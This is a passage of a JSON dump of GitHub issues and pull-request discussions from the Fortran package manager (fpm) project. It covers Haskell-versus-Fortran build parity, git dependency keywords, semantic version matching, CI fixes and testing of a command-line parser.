which I was hoping would be merged so the bigger issue of complex builds could be resolved. That would create a functional F-fpm for local projects and only leave the lib-curl  part remaining and non-Fortran.  So you would have to have gfortran and git and probably ar or its equivalent but you could build projects on a relatively normal system (and git isn't really needed to do the development) without having to install Haskell.  I was hoping we would be at that point and refining fpm to be a useful tool for building local projects; and then when the project sharing was enabled that would be the show-stopper. The toml-f package was a huge step forward, and now things seem stalled on simpler issues I thought I could get out of the way. Seems like I am missing something but Fortran needs an easy module sharing mechanism and other package managers have not seemed to catch on with the Fortran community in my experience. Seems like a project plan is missing."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-27 07:19:16+00:00",
                    "text": "Thanks for your comments @urbanjost, you raise some good points.\nRegarding the object file paths, I have no objection to matching the behaviour of Haskell fpm; but since I see little benefit to this, beyond allowing side-by-side use of h-fpm and fpm, it isn't something I will be personally addressing soon. Your 'test' for matching object file output between fpm and h-fpm seems quite arbitrary since no promises have been made about the structure of intermediate build files. Am I missing something here? Is there an important reason why you want the intermediate objects to match the Haskell version beyond your test between the two versions?\nFortran fpm can build any H-fpm package that doesn't have any external dependencies or build system - if you have a self-contained package that builds with h-fpm but not with fortran fpm please let me know! If you haven't already, please also see this index of example packages that I put together that summarises the current feature gap between fpm and h-fpm.\nRegarding the topo sort, this is already implemented within the build system via a depth-first search; there are improvements that can be made to this, in particular to enable parallel builds, but this isn't a high priority IMO."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 17:54:39+00:00",
                    "text": "In my opinion, no promises about intermediate build files or locations should be made. Even the locations of desired artifacts (e.g. library files or executables) should probably be left unspecified other than where an install command would put them. Ideally, user's should not need to know or rely on such details. Of course Hyrum's Law will almost certainly come into effect pretty quickly, so we should probably at least put some thought into it."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 18:19:12+00:00",
                    "text": "There were several comments that supported the goal of making the f-fpm version at first duplicate h-fpm and nothing I could find that clearly stated otherwise so for lack of a better goal I was trying to get it to duplicate the h-fpm version so that I could interchangeably use either h-fpm and f-fpm in the same directory, but that was primarily useful for testing the build functionality that at the time did not exist. Now that I had some time to look I see build is essentially done except for not rebuilding and what you mentioned. Nice job. So I have a bunch that fail but a quick look shows it is probably the same reason. See the trivial build\n   M_msg          = { git = \"https://github.com/urbanjost/M_msg.git\" }\n\nwhich shows a setup that works with h-fpm and not f-fpm.  After I removed the packages with external dependencies and the ones with custom make files and ones with system dependencies like X11, ncurses that uses an extension in a private version it worked very well on 17 non-trival projects which was quite exciting. In those I could (using PR #189) do  build, build -release, run --list,  test --list, run NAME, test NAME, and your build method worked with the files made with a new command as well, so for local builds it looks great. Several packages only have a custom makefile because they include C code which your version seems to support so I am going to try that. But if f-fpm should be able to build anything h-fpm does if you could take a look at the M_msg module which is the smallest example hitting the problem that would be great.\nIs supporting two languages why the .f90 suffix is left on the relocatable files? Seems to work fine but unexpected; and there was no libNAME.a files which I was not sure if was intentional but as long as using the *.o files works about the only side-effect is a slightly bigger executable.  I have seen leaving the suffix on as a way to avoid conflicts in projects that have NAME.c and NAME.f90 sources going into a single lib.a file but it is rare (actually it was me and I have seen it no where else :>)."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-27 19:49:22+00:00",
                    "text": "Apologies, yes I forgot to say that f-fpm also does not yet create static libraries libName.a as you point out.\n\n... it worked very well on 17 non-trival projects ...\n\nI'm glad to hear this!\n\nIs supporting two languages why the .f90 suffix is left on the relocatable files?\n\nYes, although we really only need to leave the suffix on non-fortran files, so it is still possible to have full compatibility with h-fpm in the intermediate files if desired.\n\n... if you could take a look at the M_msg module which is the smallest example hitting the problem that would be great.\n\nI've looked into this and opened an issue (urbanjost/M_msg#1). In summary, the difference in behaviour with h-fpm is because f-fpm does not yet support linking with static libraries."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-12 10:55:32+00:00",
                    "text": "Functionality now implemented."
                }
            ]
        },
        {
            "number": 187,
            "user": "urbanjost",
            "date": "2020-09-22 00:30:58+00:00",
            "title": "Fortran fpm(1) does not take ver= keyword on dependencies",
            "text": "In the Fortran version if you use ver= with a dependency it fails\n[dependencies.M_CLI2]\ngit = \"https://github.com/urbanjost/M_CLI2.git\"\nver = \"a177b0077819571815fa6a8da6980bcb45443858\"\nfpm run --args build\nKey ver is not allowed in dependency M_CLI2\nERROR STOP 1\nError termination. Backtrace:\n#0  0x7fc87742e131 in ???\n#1  0x7fc87742ecd9 in ???\n#2  0x7fc87742fe9b in ???\n#3  0x404570 in fpm_MOD_cmd_build\nat src/fpm.f90:101\n#4  0x401977 in MAIN\nat app/main.f90:22\n#5  0x401a20 in main\nat app/main.f90:8",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 06:05:47+00:00",
                    "text": "For reference, the bootstrap fpm will only use rev, branch or tag for git dependencies.\n\n  \n    \n      fpm/PACKAGING.md\n    \n    \n        Lines 647 to 657\n      in\n      1a394d7\n    \n    \n    \n    \n\n        \n          \n           You can also be specific about which version of a dependency you\u2019d like. You can \n        \n\n        \n          \n           specify a branch to use like \n        \n\n        \n          \n           `helloff = { git = \"https://gitlab.com/everythingfunctional/helloff.git\", branch = \"master\" }`, \n        \n\n        \n          \n           or a tag like \n        \n\n        \n          \n           `helloff = { git = \"https://gitlab.com/everythingfunctional/helloff.git\", tag = \"v1.2.3\" }`, \n        \n\n        \n          \n           or even a specific commit like \n        \n\n        \n          \n           `helloff = { git = \"https://gitlab.com/everythingfunctional/helloff.git\", rev = \"a1b2c3\" }`. \n        \n\n        \n          \n           You can even specify the path to another folder, if for example you\u2019ve got \n        \n\n        \n          \n           another fpm package in the same repository. Like this: \n        \n\n        \n          \n           `helloff = { path = \"helloff\" }`. Note that you should *not* specify paths \n        \n\n        \n          \n           outside of your repository, or things won\u2019t work for your users. \n        \n    \n  \n\n\nEverything else can be specified, but is silently ignored in bootstrap fpm."
                }
            ]
        },
        {
            "number": 186,
            "user": "awvwgk",
            "date": "2020-09-21 21:46:20+00:00",
            "title": "Implement version string validation and comparison",
            "text": "This is probably not immediately useful, therefore I'm opening it as draft for discussion.\nThis PR implements a version type, somewhat similar to Python's StrictVersion, which allows parsing version numbers and comparing them, if they follow a strict format. Version numbers can become complicated, the most involved versioning scheme I have seen so far is the Arch Linux PKGBUILD version, featuring a version epoch, a version number (probably semantic, but not necessarily) and a build number: [<int>:]<int>[.<int>...]-<int>.\nHere support for a version of the form of <int>[.<int>...] is implemented, where the number of subversions is limited to an arbitrarily chosen 10 (probably way too much) 3 (for semantic versioning <major>[.<minor>[.<patch>]]). Have a look at the tests to see what is possible.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 00:24:40+00:00",
                    "text": "I'm a big fan of semantic versioning. This means 3 parts to a version number, <major>.<minor>.<patch>. I think we should at least strongly encourage this for any published fpm packages.\nThe requirements are basically:\n\nAny additions to public interfaces require a minor version bump\nAny backward incompatible change requires a major version bump\n\nIf semantic versioning is followed, users know that patch and minor version updates are safe (won't break anything), and major version upgrades may require some rework."
                },
                {
                    "user": "certik",
                    "date": "2020-09-22 02:12:11+00:00",
                    "text": "You can probably already guess my opinion: I suggest we require semantic versioning, just like Cargo."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 06:24:10+00:00",
                    "text": "I'm all for encouraging semantic versioning. It won't hurt to give fpm at least the ability to make sense from version numbers not strictly following this scheme to make it a more robust.\nA good example is the conda-forge-pinning feedstock, not because it uses a timestamp as version, but because it has a long list of important packages not following semantic versioning."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-22 07:24:47+00:00",
                    "text": "This looks good @awvwgk. I agree that understanding versions will be important in fpm for dependencies.\nI agree with everything that @everythingfunctional has said; semantic versioning is easy and intuitive to understand.\nSince we're starting from scratch here, I also think it makes sense to stick to one version format for all packages - unless there are advantages/requirements for other formats?\nHowever many user packages won't be destined for publishing so I don't think fpm should require a version string for packages or attempt to enforce the rules of semantic versioning beyond the format of the field.\nEnforcement of semantic versioning rules should happen at package registry level (fpm-registry) with fpm simply having helper options to automatically set and bump the version as is required. fpm-registry already requires a version field to be present in package manifests during its CI checks. On PR, fpm-registry can check interfaces against any prior registry versions and throw an error if the rules aren't met. I don't believe this will be difficult to implement in our current checks."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 09:40:03+00:00",
                    "text": "Semantic versioning is fine, up to the point where the developer applying it fails to follow its convention, on purpose or by accident. Also, API breakage is not always a good measure for versioning, not every compatibility breakage is defined by an API or ABI change.\nI'm not advocating against semantic versioning. Just keep in mind that versioning can be complicated and even requiring semantic versioning might not be enough. It would be thoughtful of fpm to allow for some flexibility in this regard, even if it is just to make an already painful job of sorting out dependency versions not more painful."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 15:43:00+00:00",
                    "text": "I very much agree with what @LKedward said. True, semantic versioning isn't bullet proof - despite our best efforts, users can (intentionally or not) end up depending on internal implementation details - but it's still helpful and worth utilizing.\nI could envision allowing some additional info in the version string, but it would not be used for ordering of versions, and for any packages that supply it, that would be a necessary piece for the users of the library to include when specifying a version. The most obvious use case that comes to mind would be different versions for different operating systems, and still allow users use wildcard version specification (i.e. some_lib = '2.*-linux') would match the latest version 2.0 <= x < 3.0 that ends in -linux. Thus, a version string would have the format <major>.<minor>.<patch>[-whatever_you_want] where semantic versioning is still implied between versions with matching -whatever_you_want and there is no ordering implied between different optional endings. Seem reasonable?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 17:35:23+00:00",
                    "text": "Maybe this is just some misunderstanding. Would this mean the version string must match the regex \\d+\\.\\d+\\.\\d+?\n\nThe most obvious use case that comes to mind would be different versions for different operating systems, and still allow users use wildcard version specification (i.e. some_lib = '2.*-linux') would match the latest version 2.0 <= x < 3.0 that ends in -linux.\n\nSorry for derailing this conversation, the better solution than mangling this into the version string would be allowing the registry to specify variants and fpm use them with\nsome_lib.version = \"2\"\nsome_lib.variant = \"linux\""
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 18:09:34+00:00",
                    "text": "I think we could allow the absence of the minor or patch versions to simply imply that they are zero.\nThe variant route might be an interesting approach instead of complicating the version."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 18:44:56+00:00",
                    "text": "I set the maximum subversion limit to three, resulting effectively in \u201csemantic versioning,\u201d with optional minor and patch version.\nAlso implemented a \u201csemantic version\u201d matching for the version date type as well, while trying to keep it as flexible as possible.\nThe match operator between two versions would work like this:\nsome_dep1 = \"2\"  # >=2 and <3\nsome_dep2 = \"0.7\" # >=0.7 and <0.8\nsome_dep3 = \"1.3\" # >=1.3 and <1.4\nsome_dep4 = \"1.0.7\" # >=1.0.7 and <1.0.8 <=> ==1.0.7\n# to discuss: version numbers ending on zero\nsome_dep5 = \"2.0\" # currently >=2 and <3, not >=2.1 and <3.1\nThis might not be the best choice to determine the version number to match against:\n\n  \n    \n      fpm/fpm/src/fpm/versioning.f90\n    \n    \n        Lines 366 to 371\n      in\n      5191bef\n    \n    \n    \n    \n\n        \n          \n           do ii = size(rhs%num), 1, -1 \n        \n\n        \n          \n               if (rhs%num(ii) /= 0) then \n        \n\n        \n          \n                   tmp%num = rhs%num(:ii) \n        \n\n        \n          \n                   exit \n        \n\n        \n          \n               end if \n        \n\n        \n          \n           end do \n        \n    \n  \n\n\nProbably, we should not compare against a version data type at all, but have a separate version-constraint data type for this purpose."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-23 06:30:10+00:00",
                    "text": "I do not understand the second part of the explanation:\n\n    some_dep5 = \"2.0\" # currently >= 2 and < 3, not >= 2.1 and < 3\n\nthat is: >= 2.1. But apart from that, I would say that \"2.0\" should be\ninterpreted as >= 2.0.x and < 2.1.\n\n\nOp di 22 sep. 2020 om 20:45 schreef Sebastian Ehlert <\nnotifications@github.com>:\n\u2026\n I set the maximum subversion limit to three, resulting effectively in\n semantic versioning, with optional minor and patch version.\n Also implemented a \u201csemantic version\u201d matching for the version date type\n as well, while trying to keep it as flexible as possible.\n\n The match operator between two versions would work like this:\n\n some_dep1 = \"2\"  # >=2 and <3\n some_dep2 = \"0.7\" # >=0.7 and <0.8\n some_dep3 = \"1.3\" # >=1.3 and <1.4\n some_dep4 = \"1.0.7\" # >=1.0.7 and <1.0.8 <=> ==1.0.7\n # to discuss: version numbers ending on zero\n some_dep5 = \"2.0\" # currently >= 2 and < 3, not >= 2.1 and < 3\n\n This might not be the best choice to determine the version number to match\n against:\n\n https://github.com/fortran-lang/fpm/blob/5191befcc8a2c6dd67f0e0ab819b82fa68f39348/fpm/src/fpm/versioning.f90#L366-L371\n\n Probably, we should not compare against a version data type at all, but\n have a separate version-constraint data type for this purpose.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#186 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR3CKLRALOI5CGCYZP3SHDWDRANCNFSM4RVA5MLQ>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-23 08:52:48+00:00",
                    "text": "Agreed, I'm just using the number of subversions to create the matching now."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-23 14:28:02+00:00",
                    "text": "I believe most package managers use a different type for the package version versus the specified version of a dependency. They then use some sort of constraint solver for selecting the appropriate version from the repository/registry.\nI agree with @arjenmarkus that most users would probably expect some_dep = \"2.0\" to mean >= 2.0.0 and < 2.1.0, whereas some_dep = \"2\" would mean >=2.0.0 and <3.0.0."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 19:29:56+00:00",
                    "text": "Thanks for the input and discussion so far. I guess I will just mark it as ready for review now.\nThe .match. operator should now work as expected without surprises:\nsome_dep1 = \"2\"  # >=2 and <3\nsome_dep2 = \"0.7\" # >=0.7 and <0.8\nsome_dep3 = \"1.3\" # >=1.3 and <1.4\nsome_dep4 = \"1.0.7\" # >=1.0.7 and <1.0.8 <=> ==1.0.7\nsome_dep5 = \"2.0\" # >=2.0 and <2.1\nAll comparison operators are implemented as elemental, so they should play nicely together with array operations and any or all reductions."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 20:20:42+00:00",
                    "text": "Didn't check the code for it, but I think your example\nsome_dep5 = \"2.0\" # >=2.1 and <3.1\n\nshould be\nsome_dep5 = \"2.0\" # >=2.0 and <2.1"
                },
                {
                    "user": "certik",
                    "date": "2020-09-28 15:18:17+00:00",
                    "text": "@awvwgk, can you please address @everythingfunctional's question, and then resolve conflicts? After that this is ready to merge."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-28 15:34:28+00:00",
                    "text": "Rebased against 90ddc6f"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-29 14:31:52+00:00",
                    "text": "@awvwgk Please merge when ready."
                }
            ]
        },
        {
            "number": 185,
            "user": "LKedward",
            "date": "2020-09-21 19:01:22+00:00",
            "title": "Update: CI workflow",
            "text": "Download stack from github releases page.\nIt turns out that all three OSes on github actions have the latest release (2.3.3) of stack already installed. (See here).\nSo I've simply removed the installation steps.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-21 19:25:56+00:00",
                    "text": "That works. If it breaks we'll fix it later. +1 to meege.\n\u2026\nOn Mon, Sep 21, 2020, at 1:23 PM, Laurence Kedward wrote:\n\n\n @LKedward <https://github.com/LKedward> requested your review on: #185\n <#185> Update: CI workflow.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#185 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWESE6DATSUW2O64TDLSG6R2RANCNFSM4RU4FWJA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:57:47+00:00",
                    "text": "That's super convenient. :)"
                }
            ]
        },
        {
            "number": 184,
            "user": "certik",
            "date": "2020-09-21 15:10:55+00:00",
            "title": "Build failing due to SSL error at get.haskellstack.org",
            "text": "This URL fails to download (even in a browser for me right now) due to some SSL error:\nhttps://get.haskellstack.org/stable/windows-x86_64.zip\nAnd so our CI tests currently fail.\n@everythingfunctional what do you think we should do?\nWe can host the Haskell binaries ourselves for our CI tests.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-21 15:17:33+00:00",
                    "text": "We can host the Haskell binaries ourselves for our CI tests.\n\nThis makes sense; we already do this for the OSX binary right?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 16:25:54+00:00",
                    "text": "That's right, I forgot about that!\nI won't have time to work on this, but if anyone can upload the Windows and Linux binaries somewhere, so that we can change the links, that would be awesome."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 16:36:34+00:00",
                    "text": "Happy to do it! I just need to find another place to download them from other than haskellstack.org..."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 16:45:18+00:00",
                    "text": "@LKedward thank you, that would be a huge help!"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 16:45:25+00:00",
                    "text": "I've found binaries on the stack github page:\nhttps://github.com/commercialhaskell/stack/releases/tag/v2.3.3\nI could just replace the download links in the CI workflow file with these? Or would you prefer if we hosted them ourselves?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 16:46:54+00:00",
                    "text": "Let's just replace them for now. I think the GitHub links should be stable."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 18:38:06+00:00",
                    "text": "It looks like haskellstack.org now working again, and the main CI is now passing but I will still open a pull request to replace the stack urls with those from git."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:06:03+00:00",
                    "text": "I think there's an aspect of having one more thing to maintain if we have our own \"mirror\" for the stack binaries, and I don't know if I'd ever expect to have this problem again. You can do it if you want, but I don't know that it's necessary. Whatever you guys think."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 20:28:47+00:00",
                    "text": "Well, I had to upload the macOS binary in the past precisely for this problem. So this is the second time happening, so unfortunately I expect it to happen again.\nThis issue has been fixed by #185."
                }
            ]
        },
        {
            "number": 183,
            "user": "urbanjost",
            "date": "2020-09-21 00:24:36+00:00",
            "title": "haskel version takes commit= keyword on a dependency,  the Fortran prototype does not",
            "text": "Given a dependency with a specific git(1) commit value\n[dependencies.M_CLI2]\ngit = \"https://github.com/urbanjost/M_CLI2.git\"\ncommit = \"a177b0077819571815fa6a8da6980bcb45443858\"\nThe Fortran fpm(1) prototype complains about the commit keyword\nfpm run --args build\nKey commit is not allowed in dependency M_CLI2\nERROR STOP 1\nError termination. Backtrace:\n#0  0x7f9497368131 in ???\n#1  0x7f9497368cd9 in ???\n#2  0x7f9497369e9b in ???\n#3  0x404570 in fpm_MOD_cmd_build\nat src/fpm.f90:101\n#4  0x401977 in MAIN\nat app/main.f90:22\n#5  0x401a20 in main\nat app/main.f90:8\nbut it builds OK with the haskell version\n[urbanjs@localhost fpm]$ fpm build\n[urbanjs@localhost fpm]$\nIt looks like the commit= keyword was not enabled?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-21 05:58:24+00:00",
                    "text": "Apologies, I was mistaken in my suggestion for #181; the correct syntax for specifying a commit is rev=. This is for both versions of fpm.\nHaskell fpm does not verify the manifest file and so won't complain about commit being incorrect."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-21 23:52:10+00:00",
                    "text": "Well, the good and the bad about a full verification. In this case good."
                }
            ]
        },
        {
            "number": 182,
            "user": "urbanjost",
            "date": "2020-09-20 19:51:46+00:00",
            "title": "CLI interface to further development of subcommands",
            "text": "CLI interface to further development of subcommands\npass settings\nextended help for each subcommand\nchange commit= to ver= in fpm.toml\nver= does not work either\nno specific version as ver= does not work for M_CLI2\nadd test program for CLI\nfix fpm.toml version reference\nremove --usage references from help text\ncomment and clarify CLI unit test\nbasic RUN subcommand\nrestore fpm_command_line.f90 changes\nremove non-zero STOP for no parameters for testing\nspelling error in help\nuse basename to make sure name is a simple name\nremove dash from executable name to see if it clears MSWindows build error\ntry one more like previous build to clear error\none more time like previous version to see if build error clears on MSWindows\ndebug run to see PC variables\nmake quoting of -- ARGS values less platform dependent and change test accordingly\nchange .gitignore\nRESTORE\nRESTORE FROM BACKUP",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-09-20 20:02:40+00:00",
                    "text": "This should implement the CLI; with the only reference to which parser (M_CLI2)  used is isolated to the fpm_command_line.f90 file.  I ran into what I think is a bug with allocatable character variables of allocatable length but I believe just fixing the length to 4096 resolves that with gfortran, and implements parsing equivalent to all the parameters of the Haskell fpm(1). It should be easy to switch to an alternate parser by changing only fpm_command_line.f90\nI ran into a problem with what appears to be the Fortran TOML interface not recognizing commit= on a dependency as well, which I think shoud be changed in the TOML interface?\nWith this in place it would be a lot easier to move forward on new,run,test for at least a simple module with no dependencies although the \"libcurl\" and \"libgit\" and \"os_system\" interfaces are more significant it is hard to try things out without the CLI interface."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 15:14:55+00:00",
                    "text": "Thanks!\nThe CI tests fail due to #184. We need to fix that."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:41:20+00:00",
                    "text": "I'm still a bit unclear on how exactly to use M_CLI2 (let alone how it works), and it kind of looks like the subcommand aspect isn't a very natural fit (that part is done without the use of M_CLI2).\nBut, since it's working, and is very well isolated from the rest of the code (which is what I was aiming for no matter what solution we used), I'm happy with it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:58:43+00:00",
                    "text": "Does this just need to be rebased after #185 to fix the CI? I think that's what it looks like."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-22 13:13:49+00:00",
                    "text": "OK. Make change to fpm.toml file and added a test of the CLI interface, which gets a little complicated if you want it to actually call a process; so it uses NAMELIST groups to write information from the subprocess back to the original test process but  if you get past the NAMELIST usage it should be a thorough test.\nM_CLI2 is designed with  a more functional/procedural approach.  The documentation on the web site or included in the manpages that come with and around 10 tests on the README hopefully give an idea of how it is more typically used; I tend to go procedural until I have a reason not too so I had a bit of a time figuring out how to best fit it into the model. Never used an ABSTRACT type before, for example. It is totally isolated and in a single module as you said, so it gets things going and should be easy to change out if anyone wants to. Parts of M_CLI2 have been modernized but it was originally written before F90 existed so it might look odd to someone approaching things from an OOP stance. The biggest oddity is a rather primitive dictionary so it could be split out to be stand-alone and the original dictionary code was overkill for just command parsing."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-22 13:34:54+00:00",
                    "text": "We need to update the CI scripts to fix the CI checks:\n\nadd --args \"--version\" to the fpm run command\nremove the redundant call to execute build/gfortran_debug/app/fpm\n\nFor ci/run_tests.sh:\ndiff --git a/ci/run_tests.sh b/ci/run_tests.sh\nindex 418fcf2..5e29fa1 100755\n--- a/ci/run_tests.sh\n+++ b/ci/run_tests.sh\n@@ -4,9 +4,8 @@ set -ex\n\n cd fpm\n fpm build\n-fpm run\n+fpm run --args \"--version\"\n fpm test\n-build/gfortran_debug/app/fpm\n\nand similarly for ci/run_tests.bat:\ndiff --git a/ci/run_tests.bat b/ci/run_tests.bat\nindex 92b3cd6..6d4846f 100755\n--- a/ci/run_tests.bat\n+++ b/ci/run_tests.bat\n@@ -6,15 +6,12 @@ if errorlevel 1 exit 1\n fpm build\n if errorlevel 1 exit 1\n \n-fpm run\n+fpm run --args \"--version\"\n if errorlevel 1 exit 1\n \n fpm test\n if errorlevel 1 exit 1\n \n-build\\gfortran_debug\\app\\fpm\n-if errorlevel 1 exit 1\n-\n cd ..\\test\\example_packages\\hello_world\n if errorlevel 1 exit 1"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-22 16:24:09+00:00",
                    "text": "Thank you for adding the tests. Although I still find it quite hard to follow, what with calling itself recursively and using a file to pass data back. It's hard to see how the given command line corresponds to the expected settings object, or what the expected error is."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-23 22:55:49+00:00",
                    "text": "firefox cannot look at the failure; it displays everything off-screen on my machine; and a tool for doing pull requests is not doing what the documentation indicates it should so I cannot view this to confirm it. On my machines everything works fine. I have some simpler changes to suggest for run, test, and new that I would like to add but they depend on a functioning CLI.  Any help on reviewing this so it can be included or deleted would be appreciated, but at least on my machine I can create a new repository, build, test and run it as long as it is as simple as when the new subcommand produces (no recursive build and build always builds, but actually at least partially functional; but it runs and tests all 22 of the test cases I have so I am looking forward to being able to contribute this so the bigger hurdles of downloading and building complex cases (building only what needs rebuilt) have a full foundation to be tested with."
                },
                {
                    "user": "certik",
                    "date": "2020-09-23 23:07:09+00:00",
                    "text": "The Windows error is:\n2020-09-23T13:23:55.0047154Z # gfortran (for build/gfortran_debug/app/main.o)\n2020-09-23T13:23:55.1149736Z # gfortran (for build/gfortran_debug/app/fpm.exe)\n2020-09-23T13:23:55.4213275Z fpm: Error when running Shake build system:\n2020-09-23T13:23:55.4214301Z   at want, called at src\\Build.hs:114:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4215120Z * Depends on: build/gfortran_debug/test/main/fpm-test.exe\n2020-09-23T13:23:55.4216177Z   at need, called at src\\Build.hs:120:13 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4217038Z * Depends on: build/gfortran_debug/test/main/test_manifest.o\n2020-09-23T13:23:55.4217930Z   at &%>, called at src\\Build.hs:137:11 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4220034Z * Depends on: build/gfortran_debug/test/main/test_manifest.o build/gfortran_debug/test/main/test_manifest.mod\n2020-09-23T13:23:55.4221105Z   at undefined, called at src\\Build.hs:142:25 in fpm-0.1.0.0-9a29EtwrI5D7C1C0BiAJeV:Build\n2020-09-23T13:23:55.4221924Z   at error, called at libraries\\base\\GHC\\Err.hs:78:14 in base:GHC.Err\n2020-09-23T13:23:55.4222481Z * Raised the exception:\n2020-09-23T13:23:55.4222946Z Prelude.undefined\n\nWhich seems like a bug in our Haskell fpm? @everythingfunctional do you know what the issue is?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 00:52:02+00:00",
                    "text": "Thanks. Cannot think of anything different that would trigger that that was not in one that passed. making some trivial changes to see if a new pull request refreshes something"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 13:46:10+00:00",
                    "text": "A test of a command line parser that does not actually use the command line interface would be incomplete. I could just call the CLI parser directly but that would not check the use of the intrinsics for getting the command line arguments which can be quite different even in a single programming environment. So I think it is a much better test to actually call a program to test a program command line parser but I could be argued out of that.\nIf this is going to\nwork I doubt any single person will understand all the parts without this becoming a single-man project!!  I found the basic layout quite alien at first myself; you have to get out of your comfort zone on collaborative stuff has been my experience; so if anyone has any specific questions about the test I would be glad to answer them or add comments to the test or change the test. It is not so much complicated as uncommon to use Fortran as a shell language; but I use Fortran that way all the time so it of course seems more intuitive. Just think of the calling program as being a shell language being used to call another program that just echoes its parameters out for you to read and verify. That makes it non-recursive. Now, one of the easiest file formats to write group of values out with is NAMELIST, where it takes one line to read and write the whole group, so the test program writes out what was passed to it as a NAMELIST file. That could be anything --- JSON, TOML, etc. but those are not built in to Fortran.\nSo now the \"shell\" (the parent call to the program) just calls the program a bunch of times with different parameters and checks what the program sees after being passed through the system. If the values match it is doing what is expected. That allows you to check every major combination of the parameters the fpm program has virtually directly in about 100 lines so I stand by the approach even though I know it is different.\nI would find fpm unuseable if it can only handle one test file. I have projects that require hundreds, especially ones that have many modules in them so I hope that is not a limitation."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-24 14:48:49+00:00",
                    "text": "A test of a command line parser that does not actually use the command line interface would be incomplete. I could just call the CLI parser directly but that would not check the use of the intrinsics for getting the command line arguments which can be quite different even in a single programming environment.\n\nThis is a fair point however one of the advantages of separating functionality into packages is that testing can be separated along the same lines. For example M_CLI2 is responsible for defining an abstraction that interfaces with get_command_argument intrinsics etc.; therefore testing at this level should occur within the M_CLI2 package (I assume it already does) and packages using M_CLI2 need only test what they implement atop M_CLI2. This ideally takes the form of 'short-circuiting' the get_command_argument intrinsic.\nI don't really object to the recursive execution with namelist file, this is a neat end-to-end testing solution; my comment was referring to why this couldn't be implemented within the existing test framework like test_manifest.f90, test_toml.f90 and test_source_parsing.f90. I believe it is possible, but with some complication regarding where the existing parse() method will go. The existing test framework nicely defines test suites with self-contained tests that are easy to interpret.\n\nI would find fpm unuseable if it can only handle one test file. I have projects that require hundreds, especially ones that have many modules in them so I hope that is not a limitation.\n\nThis is not the intended behaviour for fpm as has been discussed in #164. This may be a bug or unimplemented feature in bootstrap fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 16:07:55+00:00",
                    "text": "The bootstrap fpm should support multiple test executables, I have multiple in order to test the IO parts of iso_varying_string. I'll see if I can spare some time today to look more closely at the failure. It seems it must be something Windows specific, since the other OS's are passing."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 17:28:24+00:00",
                    "text": "As I suspected, Windows paths were mucking things up again. I fixed that, and now it looks like there are legitimately a couple failing tests in the CLI on Windows."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 17:39:20+00:00",
                    "text": "It looks like something having to do with the way Windows deals with spaces in command line arguments being ... problematic. I think you have to use double quotes (IIRC).\nSee this question I once asked on Stack Overflow for some additional background and to start you down the rabbit hole: https://stackoverflow.com/questions/43813677/escaping-spaces-in-windows"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-24 19:01:24+00:00",
                    "text": "It looks like you clobbered my build fix. Would you like me to re-push it?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 19:20:22+00:00",
